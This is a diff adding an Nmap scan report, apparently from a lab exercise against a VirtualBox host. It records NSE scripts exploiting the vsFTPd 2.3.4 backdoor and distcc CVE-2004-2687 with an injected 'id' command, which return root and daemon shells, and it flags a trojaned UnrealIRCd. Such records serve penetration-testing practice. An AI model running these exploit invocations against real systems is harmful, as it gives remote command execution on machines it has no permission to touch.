@@ -1,0 +1,45 @@
+# Nmap 7.99 scan initiated Thu Nov 12 10:40:01 2026 as: /usr/lib/nmap/nmap -p 21,3632,6667 --script ftp-vsftpd-backdoor,distcc-cve2004-2687,irc-unrealircd-backdoor --script-args distcc-cve2004-2687.cmd=id,ftp-vsftpd-backdoor.cmd=id -oA /home/kali/vuln/p8-02-backdoors 10.10.10.30
+Nmap scan report for 10.10.10.30
+Host is up (0.00063s latency).
+
+PORT     STATE SERVICE
+21/tcp   open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523  BID:48539
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+|       https://www.securityfocus.com/bid/48539
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+3632/tcp open  distccd
+| distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|_      https://distcc.github.io/security.html
+6667/tcp open  irc
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+MAC Address: 08:00:27:4B:14:1A (Oracle VirtualBox virtual NIC)
+
+# Nmap done at Thu Nov 12 10:40:41 2026 -- 1 IP address (1 host up) scanned in 40.49 seconds
